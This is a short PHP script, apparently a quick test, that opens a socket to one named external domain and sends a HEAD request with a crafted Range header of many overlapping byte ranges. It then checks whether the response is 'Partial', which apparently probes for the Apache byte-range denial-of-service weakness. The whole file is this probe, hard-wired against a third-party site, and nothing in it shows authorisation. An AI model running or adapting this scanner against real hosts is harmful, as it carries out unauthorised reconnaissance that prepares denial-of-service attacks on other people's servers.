<?php    
printf("oi");
$host = 'institucional.me.com.br';

function check_for_exploit($host,$port=80,$timeout=10){
    $range = '0-1';
    for($i=0;$i<20;$i++){
    $range .= ",5-$i";
    }
     
    $error_code = null;
    $error = null;
     
    $socket = fsockopen($host,$port,$error_code,$error,$timeout);
    $packet = "HEAD / HTTP/1.1\r\nHost: $host\r\nRange:bytes=$range\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
    fwrite($socket,$packet);
    $result = fread($socket,2048);
    //check to see if "Partial" is in the response
    if(strstr($result,"Partial") !== false){
    return true;
    }
    return false;
    }

check_for_exploit($host = 'institucional.me.com.br');
?>
